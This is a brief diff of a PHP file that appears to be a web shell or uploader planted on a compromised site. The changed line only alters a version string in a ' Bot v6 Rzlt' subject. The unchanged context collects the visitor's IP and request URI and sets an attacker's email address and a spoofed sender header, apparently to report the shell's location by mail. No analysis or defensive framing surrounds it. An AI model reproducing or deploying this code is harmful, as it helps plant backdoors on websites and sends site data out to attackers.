@@ -10,7 +10,7 @@ else { echo '<b>Not uploaded ! </b><br><br>'; }
 <?php
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
-$subj98 = " Bot v7 Rzlt |$ip";
+$subj98 = " Bot v6 Rzlt |$ip";
 $email = "mrneo.shells@gmail.com";
 $from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
